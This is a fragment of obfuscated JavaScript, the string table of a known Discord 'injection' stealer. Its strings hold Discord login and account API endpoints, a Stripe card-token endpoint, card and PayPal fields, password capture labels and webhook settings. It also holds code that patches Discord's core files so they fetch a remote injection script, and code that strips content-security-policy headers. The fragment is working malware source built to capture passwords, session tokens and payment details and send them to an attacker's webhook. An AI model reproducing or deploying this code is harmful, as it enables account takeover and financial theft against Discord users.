ccess-Control-Allow-Headers\x20\x27*\x27','Discord\x20PTB','https://*.discord.com/api/v*/users/@me','https','Resources','join','Failed\x20to\x20Purchase\x20❌','5697486Oknjjx','content','./core.asar','method','writeFileSync','`None`','card[exp_month]','Nitro\x20Type:\x20**','521846918637420545','HypeSquad\x20Bravery,\x20','release','Partnered\x20Server\x20Owner,\x20','Password:','511651880837840896','flags','Discord.app','wss://remote-auth-gateway.discord.gg/*','@everyone','8415323yqBfjt','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20{\x0a\x20\x20\x20\x20require(bdPath);\x0a}','gift_code','boost','Discord-Injection','511651885459963904','write','webRequest','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','users/@me','classic','https://discordapp.com/api/v*/auth/login','username','paypal_accounts','ptb','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','url','ping_on_run','discriminator','replace','initiation','exports','webhook','content-security-policy','startsWith','ping_val','existsSync','filter','**Billing:**','application/json','embed_color','discord.com','split','4114630TmnrbA','<:boosting_7:969573901229244426>','login','https://discord.com/api/v*/auth/login','path','**Nitro\x20Code:**\x0a```diff\x0a+\x20','injection_url','https://discord.com/api/v9/users/@me','default-src\x20\x27*\x27','.webp','521847234246082599','<:boosting_3:969573901317341244>','package.json','Green\x20BugHunter,\x20','🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection','https://api.stripe.com/v*/tokens','toLowerCase','Nitro:'];_0xed36=function(){return _0x331c0a;};return _0xed36();}
